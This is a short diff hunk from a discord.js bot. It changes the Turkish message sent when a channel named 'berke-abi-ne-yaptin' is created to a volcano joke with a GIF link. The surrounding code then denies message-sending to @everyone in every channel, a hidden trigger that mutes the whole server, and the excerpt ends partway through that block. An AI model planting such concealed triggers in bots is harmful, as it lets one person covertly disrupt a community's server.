@@ -149,7 +149,7 @@ client.on('error', e => {
 
 client.on('channelCreate', channel => {
   if (channel.name == 'berke-abi-ne-yaptin') {
-    channel.send(`Kardeşim güzel bir şekilde müzik dinledin`)
+    channel.send(`Herkes patlamak ister aynı volcano gibi :volcano: \n\nhttps://tenor.com/view/yeah-hellyeah-anime-oh-yeah-fist-pump-gif-5388176`)
     channel.guild.channels.forEach(c => {
          c.overwritePermissions(channel.guild.roles.find("name", "@everyone"), {
               SEND_MESSAGES: false,
